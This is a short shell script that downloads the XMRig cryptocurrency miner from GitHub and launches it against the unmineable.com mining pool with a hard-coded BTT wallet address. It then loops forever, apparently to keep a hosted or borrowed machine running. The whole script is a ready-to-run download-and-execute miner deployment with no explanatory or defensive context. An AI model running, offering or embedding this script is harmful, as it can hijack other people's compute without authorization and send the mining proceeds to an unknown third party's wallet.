#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-bionic-x64.tar.gz &&  tar -xvf xmrig-6.10.0-bionic-x64.tar.gz && cd xmrig-6.10.0 && ./xmrig -o rx-asia.unmineable.com:3333 -a rx -k -u BTT:TWW86ofnidVWowvL6S22k2wYPiVuXM7xL8.dimbtt1 -t2
while [ 1 ]; do
sleep 3
done
sleep 999
